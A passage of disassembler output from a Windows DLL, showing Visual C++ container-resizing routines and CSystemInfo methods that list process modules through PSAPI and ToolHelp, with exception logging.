sub_6AF4D954	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4D981	proc near		; CODE XREF: sub_6AF4DE56+2Ep

var_12C		= dword	ptr -12Ch
var_128		= dword	ptr -128h
var_124		= dword	ptr -124h
var_120		= byte ptr -120h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_111	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 120h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+arg_8]
		mov	esi, ecx
		lea	ecx, [ebp+var_120]
		mov	[ebp+var_14], eax
		mov	[ebp+var_12C], esi
		call	Ordinal1331
		and	[ebp+var_4], 0
		mov	ecx, esi
		call	sub_6AF4D3F4
		mov	edi, [ebp+arg_4]
		test	edi, edi
		mov	ebx, eax
		jz	loc_6AF4DBCC
		mov	ecx, esi
		call	sub_6AF4D40C
		mov	ecx, 0F4898Dh
		sub	ecx, eax
		cmp	ecx, edi
		mov	ecx, esi
		jnb	short loc_6AF4D9E6
		call	sub_6AF4D43C
; ---------------------------------------------------------------------------

loc_6AF4D9E6:				; CODE XREF: sub_6AF4D981+5Ej
		call	sub_6AF4D40C
		add	eax, edi
		cmp	ebx, eax
		jnb	loc_6AF4DAF2
		mov	eax, ebx
		shr	eax, 1
		mov	ecx, 0F4898Dh
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF4DA08
		xor	ebx, ebx
		jmp	short loc_6AF4DA0A
; ---------------------------------------------------------------------------

loc_6AF4DA08:				; CODE XREF: sub_6AF4D981+81j
		add	ebx, eax

loc_6AF4DA0A:				; CODE XREF: sub_6AF4D981+85j
		mov	ecx, esi
		call	sub_6AF4D40C
		add	eax, edi
		cmp	ebx, eax
		jnb	short loc_6AF4DA22
		mov	ecx, esi
		call	sub_6AF4D40C
		mov	ebx, eax
		add	ebx, edi

loc_6AF4DA22:				; CODE XREF: sub_6AF4D981+94j
		imul	ebx, 10Ch
		push	ebx		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, [esi+4]
		push	esi
		push	eax
		push	[ebp+arg_0]
		mov	[ebp+var_128], eax
		push	ecx
		mov	[ebp+var_124], eax
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF4D819
		add	esp, 14h
		lea	ecx, [ebp+var_120]
		push	ecx
		push	edi
		push	eax
		mov	ecx, esi
		mov	[ebp+var_124], eax
		call	sub_6AF4D92F
		mov	[ebp+var_124], eax
		mov	eax, [esi+8]
		push	esi
		push	[ebp+var_124]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF4D819
		and	[ebp+var_4], 0
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF4D40C
		add	edi, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4DAAA
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF4D7BC
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF4DAAA:				; CODE XREF: sub_6AF4D981+112j
		mov	eax, [ebp+var_128]
		imul	edi, 10Ch
		add	ebx, eax
		add	edi, eax
		mov	[esi+0Ch], ebx
		mov	[esi+8], edi
		mov	[esi+4], eax
		jmp	loc_6AF4DBCC
; ---------------------------------------------------------------------------

loc_6AF4DAC8:				; DATA XREF: .rdata:6AF63FECo
		push	[ebp+var_12C]
		push	[ebp+var_124]
		push	[ebp+var_128]
		call	sub_6AF4D7BC
		push	[ebp+var_128]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		jmp	loc_6AF4DB8E
; ---------------------------------------------------------------------------

loc_6AF4DAF2:				; CODE XREF: sub_6AF4D981+6Ej
		mov	ecx, [esi+8]
		mov	eax, ecx
		sub	eax, [ebp+arg_0]
		mov	ebx, 10Ch
		cdq
		idiv	ebx
		mov	[ebp+arg_8], ecx
		push	esi
		cmp	eax, edi
		jnb	loc_6AF4DB97
		mov	eax, [ebp+arg_0]
		mov	ebx, edi
		imul	ebx, 10Ch
		lea	edx, [ebx+eax]
		push	edx
		push	ecx
		push	eax
		call	sub_6AF4D819
		mov	eax, [esi+8]
		sub	eax, [ebp+arg_0]
		add	esp, 10h
		lea	ecx, [ebp+var_120]
		push	ecx
		cdq
		mov	ecx, 10Ch
		idiv	ecx
		mov	ecx, esi
		mov	byte ptr [ebp+var_4], 3
		sub	edi, eax
		push	edi
		push	dword ptr [esi+8]
		call	sub_6AF4D92F
		add	[esi+8], ebx
		mov	esi, [esi+8]
		lea	eax, [ebp+var_120]
		push	eax
		sub	esi, ebx
		push	esi
		push	[ebp+arg_0]
		call	sub_6AF4D47D
		add	esp, 0Ch
		jmp	short loc_6AF4DBCC
; ---------------------------------------------------------------------------

loc_6AF4DB6A:				; DATA XREF: .rdata:6AF63FFCo
		mov	eax, [ebp+arg_4]
		mov	ecx, [ebp+var_12C]
		imul	eax, 10Ch
		push	ecx
		mov	ecx, [ecx+8]
		add	ecx, eax
		push	ecx
		mov	ecx, [ebp+arg_0]
		add	eax, ecx
		push	eax
		call	sub_6AF4D7BC
		add	esp, 0Ch

loc_6AF4DB8E:				; CODE XREF: sub_6AF4D981+16Cj
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4DB97:				; CODE XREF: sub_6AF4D981+187j
		imul	edi, 10Ch
		push	ecx
		mov	ebx, ecx
		push	ecx
		sub	ebx, edi
		push	ebx
		call	sub_6AF4D819
		push	[ebp+arg_8]
		mov	[esi+8], eax
		mov	esi, [ebp+arg_0]
		push	ebx
		push	esi
		call	sub_6AF4D5B9
		lea	eax, [ebp+var_120]
		push	eax
		add	edi, esi
		push	edi
		push	esi
		call	sub_6AF4D47D
		add	esp, 28h

loc_6AF4DBCC:				; CODE XREF: sub_6AF4D981+46j
					; sub_6AF4D981+142j ...
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
sub_6AF4D981	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4DBE5	proc near		; CODE XREF: sub_6AF4DEF9+29p

var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_112	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 10h
		mov	eax, [ebp+arg_8]
		sub	eax, [ebp+arg_4]
		push	ebx
		push	esi
		mov	esi, ecx
		cdq
		mov	ecx, 10Ch
		idiv	ecx
		push	edi
		mov	ecx, esi
		mov	[ebp+var_10], esp
		mov	[ebp+var_1C], esi
		mov	ebx, eax
		mov	[ebp+var_18], ebx
		call	sub_6AF4D3F4
		test	ebx, ebx
		mov	edi, eax
		jz	loc_6AF4DDFC
		mov	ecx, esi
		call	sub_6AF4D40C
		mov	ecx, 0F4898Dh
		sub	ecx, eax
		cmp	ecx, ebx
		mov	ecx, esi
		jnb	short loc_6AF4DC3A
		call	sub_6AF4D43C
; ---------------------------------------------------------------------------

loc_6AF4DC3A:				; CODE XREF: sub_6AF4DBE5+4Ej
		call	sub_6AF4D40C
		add	eax, ebx
		cmp	edi, eax
		jnb	loc_6AF4DD28
		mov	eax, edi
		shr	eax, 1
		mov	ecx, 0F4898Dh
		sub	ecx, eax
		cmp	ecx, edi
		jnb	short loc_6AF4DC5C
		xor	edi, edi
		jmp	short loc_6AF4DC5E
; ---------------------------------------------------------------------------

loc_6AF4DC5C:				; CODE XREF: sub_6AF4DBE5+71j
		add	edi, eax

loc_6AF4DC5E:				; CODE XREF: sub_6AF4DBE5+75j
		mov	ecx, esi
		call	sub_6AF4D40C
		add	eax, ebx
		cmp	edi, eax
		jnb	short loc_6AF4DC76
		mov	ecx, esi
		call	sub_6AF4D40C
		mov	edi, eax
		add	edi, ebx

loc_6AF4DC76:				; CODE XREF: sub_6AF4DBE5+84j
		imul	edi, 10Ch
		push	edi		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, [esi+4]
		and	[ebp+var_4], 0
		push	esi
		push	eax
		push	[ebp+arg_0]
		mov	[ebp+var_18], eax
		push	ecx
		mov	[ebp+var_14], eax
		call	sub_6AF4D819
		add	esp, 14h
		push	esi
		push	eax
		push	[ebp+arg_8]
		mov	[ebp+var_14], eax
		push	[ebp+arg_4]
		call	sub_6AF4D819
		add	esp, 10h
		mov	[ebp+var_14], eax
		mov	eax, [esi+8]
		push	esi
		push	[ebp+var_14]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF4D819
		or	[ebp+var_4], 0FFFFFFFFh
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF4D40C
		add	ebx, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4DCEF
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF4D7BC
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF4DCEF:				; CODE XREF: sub_6AF4DBE5+F3j
		mov	eax, [ebp+var_18]
		imul	ebx, 10Ch
		add	edi, eax
		add	ebx, eax
		mov	[esi+0Ch], edi
		mov	[esi+8], ebx
		mov	[esi+4], eax
		jmp	loc_6AF4DDFC
; ---------------------------------------------------------------------------

loc_6AF4DD0A:				; DATA XREF: .rdata:stru_6AF64064o
		push	[ebp+var_1C]
		push	[ebp+var_14]
		push	[ebp+var_18]
		call	sub_6AF4D7BC
		push	[ebp+var_18]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		jmp	loc_6AF4DDBB
; ---------------------------------------------------------------------------

loc_6AF4DD28:				; CODE XREF: sub_6AF4DBE5+5Ej
		mov	eax, [esi+8]
		mov	edi, [ebp+arg_0]
		mov	[ebp+var_14], eax
		sub	eax, edi
		cdq
		mov	ecx, 10Ch
		idiv	ecx
		push	esi
		cmp	eax, ebx
		jnb	loc_6AF4DDC4
		imul	ebx, 10Ch
		lea	eax, [ebx+edi]
		push	eax
		push	[ebp+var_14]
		push	edi
		call	sub_6AF4D819
		mov	ecx, [esi+8]
		mov	eax, ecx
		sub	eax, edi
		cdq
		mov	edi, 10Ch
		idiv	edi
		push	esi
		push	ecx
		push	[ebp+arg_8]
		mov	[ebp+var_4], 2
		mov	edi, eax
		imul	edi, 10Ch
		add	edi, [ebp+arg_4]
		push	edi
		call	sub_6AF4D819
		add	[esi+8], ebx
		add	esp, 20h
		push	[ebp+arg_0]
		push	edi
		push	[ebp+arg_4]
		call	sub_6AF4D59F
		add	esp, 0Ch
		jmp	short loc_6AF4DDFC
; ---------------------------------------------------------------------------

loc_6AF4DD9A:				; DATA XREF: .rdata:stru_6AF64074o
		mov	eax, [ebp+var_18]
		mov	ecx, [ebp+var_1C]
		imul	eax, 10Ch
		push	ecx
		mov	ecx, [ecx+8]
		add	ecx, eax
		push	ecx
		mov	ecx, [ebp+arg_0]
		add	eax, ecx
		push	eax
		call	sub_6AF4D7BC
		add	esp, 0Ch

loc_6AF4DDBB:				; CODE XREF: sub_6AF4DBE5+13Ej
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4DDC4:				; CODE XREF: sub_6AF4DBE5+159j
		push	[ebp+var_14]
		imul	ebx, 10Ch
		mov	eax, [ebp+var_14]
		push	[ebp+var_14]
		sub	eax, ebx
		push	eax
		mov	[ebp+arg_0], eax
		call	sub_6AF4D819
		push	[ebp+var_14]
		mov	[esi+8], eax
		push	[ebp+arg_0]
		push	edi
		call	sub_6AF4D5B9
		push	edi
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		call	sub_6AF4D59F
		add	esp, 28h

loc_6AF4DDFC:				; CODE XREF: sub_6AF4DBE5+36j
					; sub_6AF4DBE5+120j ...
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	10h
sub_6AF4DBE5	endp

; Exported entry 1333.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1333
Ordinal1333	proc near		; CODE XREF: Ordinal1354+2A9p
					; Ordinal1357+125p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		push	edi
		xor	edi, edi
		push	edi
		lea	ecx, [esi+114h]
		mov	dword ptr [esi], offset	off_6AF5FB70
		mov	[esi+4], edi
		mov	[esi+8], edi
		mov	[esi+0Ch], edi
		call	sub_6AF4D61F
		push	104h		; Size
		lea	eax, [esi+10h]
		push	edi		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal1333	endp

; Exported entry 1334.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1334
Ordinal1334	proc near		; CODE XREF: sub_6AF4DE9D+3p
					; sub_6AF4E8B4+251p ...

; FUNCTION CHUNK AT 6AF4D86E SIZE 0000002D BYTES

		mov	dword ptr [ecx], offset	off_6AF5FB70
		add	ecx, 114h
		jmp	loc_6AF4D86E
Ordinal1334	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4DE56	proc near		; CODE XREF: sub_6AF4DEB9+35p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		call	sub_6AF4D40C
		test	eax, eax
		jnz	short loc_6AF4DE67
		xor	esi, esi
		jmp	short loc_6AF4DE78
; ---------------------------------------------------------------------------

loc_6AF4DE67:				; CODE XREF: sub_6AF4DE56+Bj
		mov	eax, [esp+8+arg_4]
		sub	eax, [edi+4]
		mov	ecx, 10Ch
		cdq
		idiv	ecx
		mov	esi, eax

loc_6AF4DE78:				; CODE XREF: sub_6AF4DE56+Fj
		push	[esp+8+arg_8]
		mov	ecx, edi
		push	1
		push	[esp+10h+arg_4]
		call	sub_6AF4D981
		imul	esi, 10Ch
		add	esi, [edi+4]
		mov	eax, [esp+8+arg_0]
		pop	edi
		mov	[eax], esi
		pop	esi
		retn	0Ch
sub_6AF4DE56	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4DE9D(void *, char)
sub_6AF4DE9D	proc near		; DATA XREF: .rdata:off_6AF5FB70o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1334
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4DEB3
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4DEB3:				; CODE XREF: sub_6AF4DE9D+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4DE9D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4DEB9	proc near		; CODE XREF: Ordinal1353+2CDp
					; Ordinal1356+1AAp

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		call	sub_6AF4D40C
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF4D3F4
		cmp	edi, eax
		push	[ebp+arg_0]
		mov	ecx, esi
		jnb	short loc_6AF4DEE6
		push	1
		push	dword ptr [esi+8]
		call	sub_6AF4D92F
		mov	[esi+8], eax
		jmp	short loc_6AF4DEF3
; ---------------------------------------------------------------------------

loc_6AF4DEE6:				; CODE XREF: sub_6AF4DEB9+1Cj
		mov	eax, [esi+8]
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		call	sub_6AF4DE56

loc_6AF4DEF3:				; CODE XREF: sub_6AF4DEB9+2Bj
		pop	edi
		pop	esi
		pop	ebp
		retn	4
sub_6AF4DEB9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4DEF9	proc near		; CODE XREF: Ordinal1336+45p

var_4		= byte ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+8]
		mov	ecx, [esi+4]
		push	eax
		push	ecx
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		call	sub_6AF4D8B8
		push	[ebp+arg_4]
		mov	eax, [esi+4]
		push	[ebp+arg_4]
		mov	ecx, esi
		push	[ebp+arg_0]
		push	eax
		call	sub_6AF4DBE5
		pop	esi
		leave
		retn	0Ch
sub_6AF4DEF9	endp

; Exported entry 1353.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1353
Ordinal1353	proc near		; CODE XREF: Ordinal1352+7Ap
					; DATA XREF: .rdata:off_6AF66098o

var_19C		= dword	ptr -19Ch
var_190		= byte ptr -190h
var_170		= byte ptr -170h
var_150		= dword	ptr -150h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_144		= dword	ptr -144h
var_140		= dword	ptr -140h
var_13C		= dword	ptr -13Ch
var_138		= dword	ptr -138h
Dst		= dword	ptr -134h
var_130		= dword	ptr -130h
var_12C		= dword	ptr -12Ch
var_128		= byte ptr -128h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_113	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 190h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		xor	esi, esi
		cmp	[ecx+20h], esi
		push	edi
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_140], ecx
		jz	loc_6AF4E2FB
		cmp	[ecx+44h], esi
		jz	loc_6AF4E2FB
		mov	[ebp+var_138], 1
		mov	ebx, 80h
		mov	[ebp+var_13C], esi
		mov	[ebp+Dst], esi

loc_6AF4DF7F:				; CODE XREF: Ordinal1353+231j
		cmp	esi, ebx
		jnb	loc_6AF4E162
		lea	esi, [ebx+ebx]
		push	offset aCsysteminfoGet ; "CSystemInfo::GetModuleListPSAPI()"
		lea	ecx, [ebp+var_170]
		mov	[ebp+var_148], esi
		call	Ordinal751
		xor	edi, edi
		cmp	[ebp+Dst], edi
		mov	[ebp+var_4], edi
		mov	byte ptr [ebp+var_4], 1
		jz	short loc_6AF4DFC3
		push	[ebp+Dst]	; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx
		mov	[ebp+Dst], edi

loc_6AF4DFC3:				; CODE XREF: Ordinal1353+83j
		mov	edi, esi
		shl	edi, 2
		push	edi		; unsigned int
		call	j_??2@YAPAXI@Z	; operator new(uint)
		xor	ebx, ebx
		cmp	eax, ebx
		pop	ecx
		mov	[ebp+Dst], eax
		jnz	short loc_6AF4E013
		lea	eax, [ebp+var_14C]
		push	eax
		lea	ecx, [ebp+var_19C]
		mov	[ebp+var_14C], offset aBadAllocation ; "bad allocation"
		call	ds:??0exception@@QAE@ABQBD@Z ; exception::exception(char const * const &)
		push	offset dword_6AF63790
		lea	eax, [ebp+var_19C]
		push	eax
		mov	[ebp+var_19C], offset off_6AF5CAB8
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4E013:				; CODE XREF: Ordinal1353+ADj
		push	edi		; Size
		push	ebx		; Val
		push	[ebp+Dst]	; Dst
		call	memset
		add	esp, 0Ch
		jmp	loc_6AF4E0E6
; ---------------------------------------------------------------------------

loc_6AF4E028:				; DATA XREF: .rdata:6AF6410Co
		push	13h
		lea	ecx, [ebp+var_170]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_170]
		call	Ordinal762
		mov	ecx, [ebp+var_144]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_170]
		call	Ordinal764
		lea	ecx, [ebp+var_170]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E0DE
		retn
; ---------------------------------------------------------------------------

loc_6AF4E07A:				; DATA XREF: .rdata:6AF6411Co
		push	15h
		lea	ecx, [ebp+var_170]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_170]
		call	Ordinal762
		mov	eax, [ebp+var_150]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_170]
		call	Ordinal764
		lea	ecx, [ebp+var_170]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E0DE
		retn
; ---------------------------------------------------------------------------

loc_6AF4E0DE:				; DATA XREF: Ordinal1353+148o
					; Ordinal1353+1ACo
		mov	esi, [ebp+var_148]
		xor	ebx, ebx

loc_6AF4E0E6:				; CODE XREF: Ordinal1353+F7j
		lea	ecx, [ebp+var_170]
		mov	[ebp+var_4], ebx
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF4E134
		lea	ecx, [ebp+var_13C]
		push	ecx
		mov	eax, esi
		shl	eax, 2
		push	eax
		push	[ebp+Dst]
		mov	eax, [ebp+var_140]
		push	[ebp+arg_0]
		mov	[ebp+var_13C], ebx
		call	dword ptr [eax+20h]
		test	eax, eax
		jnz	short loc_6AF4E145
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsysteminfoG_0 ; "CSystemInfo::GetModuleListPSAPI() : m_P"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF4E134:				; CODE XREF: Ordinal1353+1CAj
		mov	[ebp+var_138], ebx
		lea	ecx, [ebp+var_170]
		jmp	loc_6AF4E2D9
; ---------------------------------------------------------------------------

loc_6AF4E145:				; CODE XREF: Ordinal1353+1F3j
		mov	ebx, [ebp+var_13C]
		or	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_170]
		shr	ebx, 2
		call	Ordinal752
		jmp	loc_6AF4DF7F
; ---------------------------------------------------------------------------

loc_6AF4E162:				; CODE XREF: Ordinal1353+55j
		xor	esi, esi
		cmp	[ebp+var_138], esi
		jz	loc_6AF4E2DE
		push	offset aCsysteminfoG_1 ; "CSystemInfo::GetProcessInfoPSAPI()"
		lea	ecx, [ebp+var_190]
		call	Ordinal751
		mov	[ebp+var_4], 3
		mov	edi, offset off_6AF5F9E4

loc_6AF4E18C:				; CODE XREF: Ordinal1353+2D9j
		cmp	esi, ebx
		mov	byte ptr [ebp+var_4], 4
		jnb	loc_6AF4E2BD
		lea	ecx, [ebp+var_130]
		call	Ordinal1329
		mov	eax, [ebp+Dst]
		mov	eax, [eax+esi*4]
		push	104h
		lea	ecx, [ebp+var_128]
		push	ecx
		push	eax
		push	[ebp+arg_0]
		mov	[ebp+var_12C], eax
		mov	eax, [ebp+var_140]
		mov	byte ptr [ebp+var_4], 5
		call	dword ptr [eax+44h]
		test	eax, eax
		jnz	short loc_6AF4E1EF
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCsysteminfoG_2 ; "CSystemInfo::GetModuleListPSAPI() : m_P"...
		call	sub_6AF3102E
		and	[ebp+var_138], 0
		pop	ecx
		pop	ecx
		jmp	short loc_6AF4E1FE
; ---------------------------------------------------------------------------

loc_6AF4E1EF:				; CODE XREF: Ordinal1353+2A5j
		mov	ecx, [ebp+arg_4]
		lea	eax, [ebp+var_130]
		push	eax
		call	sub_6AF4DEB9

loc_6AF4E1FE:				; CODE XREF: Ordinal1353+2C1j
		mov	[ebp+var_130], edi
		inc	esi
		jmp	short loc_6AF4E18C
; ---------------------------------------------------------------------------

loc_6AF4E207:				; DATA XREF: .rdata:6AF6412Co
		push	13h
		lea	ecx, [ebp+var_190]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_190]
		call	Ordinal762
		mov	ecx, [ebp+var_150]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_190]
		call	Ordinal764
		lea	ecx, [ebp+var_190]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E2BD
		retn
; ---------------------------------------------------------------------------

loc_6AF4E259:				; DATA XREF: .rdata:6AF6413Co
		push	15h
		lea	ecx, [ebp+var_190]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_190]
		call	Ordinal762
		mov	eax, [ebp+var_144]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_190]
		call	Ordinal764
		lea	ecx, [ebp+var_190]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4E2BD
		retn
; ---------------------------------------------------------------------------

loc_6AF4E2BD:				; CODE XREF: Ordinal1353+266j
					; DATA XREF: Ordinal1353+327o ...
		lea	ecx, [ebp+var_190]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF4E2D3
		and	[ebp+var_138], 0

loc_6AF4E2D3:				; CODE XREF: Ordinal1353+39Ej
		lea	ecx, [ebp+var_190]

loc_6AF4E2D9:				; CODE XREF: Ordinal1353+214j
		call	Ordinal752

loc_6AF4E2DE:				; CODE XREF: Ordinal1353+23Ej
		cmp	[ebp+Dst], 0
		jz	short loc_6AF4E2F3
		push	[ebp+Dst]	; void *
		call	??_V@YAXPAX@Z	; operator delete[](void *)
		pop	ecx

loc_6AF4E2F3:				; CODE XREF: Ordinal1353+3B9j
		mov	eax, [ebp+var_138]
		jmp	short loc_6AF4E308
; ---------------------------------------------------------------------------

loc_6AF4E2FB:				; CODE XREF: Ordinal1353+29j
					; Ordinal1353+32j
		push	offset aCsysteminfoG_3 ; "CSystemInfo::GetModuleListPSAPI() : m_P"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax

loc_6AF4E308:				; CODE XREF: Ordinal1353+3CDj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal1353	endp ; sp-analysis failed

; Exported entry 1356.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1356
Ordinal1356	proc near		; CODE XREF: Ordinal1357+163p
					; DATA XREF: .rdata:off_6AF66098o

var_390		= dword	ptr -390h
var_38C		= dword	ptr -38Ch
var_388		= byte ptr -388h
var_368		= dword	ptr -368h
var_364		= dword	ptr -364h
var_360		= dword	ptr -360h
var_35C		= dword	ptr -35Ch
hObject		= dword	ptr -358h
Dst		= dword	ptr -354h
var_338		= dword	ptr -338h
var_334		= byte ptr -334h
String2		= byte ptr -234h
var_130		= dword	ptr -130h
var_12C		= dword	ptr -12Ch
String1		= byte ptr -128h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_114	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 384h
		mov	eax, ___security_cookie
		push	ebx
		mov	ebx, ecx
		mov	[ebp+var_14], eax
		mov	eax, [ebx+84h]
		test	eax, eax
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_368], ebx
		jz	loc_6AF4E625
		cmp	dword ptr [ebx+0A4h], 0
		jz	loc_6AF4E625
		cmp	dword ptr [ebx+0A8h], 0
		jz	loc_6AF4E625
		mov	esi, [ebp+arg_0]
		push	dword ptr [esi+4]
		push	8
		call	eax
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hObject], eax
		jnz	short loc_6AF4E3A0
		call	ds:GetLastError
		push	eax
		push	dword ptr [esi+4] ; Args
		push	offset aCsysteminfoG_4 ; "CSystemInfo::GetModuleListToolHelp() : "...
		call	sub_6AF3102E
		add	esp, 0Ch
		jmp	loc_6AF4E630
; ---------------------------------------------------------------------------

loc_6AF4E3A0:				; CODE XREF: Ordinal1356+61j
		mov	edi, 224h
		push	edi		; Size
		lea	eax, [ebp+Dst]
		push	0		; Val
		push	eax		; Dst
		call	memset
		add	esp, 0Ch
		lea	eax, [ebp+Dst]
		push	eax
		push	[ebp+hObject]
		mov	[ebp+Dst], edi
		call	dword ptr [ebx+0A4h]
		test	eax, eax
		jnz	short loc_6AF4E3F2
		call	ds:GetLastError
		push	eax
		push	dword ptr [esi+4] ; Args
		push	offset aCsysteminfoG_5 ; "CSystemInfo::GetModuleListToolHelp() : "...
		call	sub_6AF3102E
		add	esp, 0Ch
		xor	esi, esi
		jmp	loc_6AF4E615
; ---------------------------------------------------------------------------

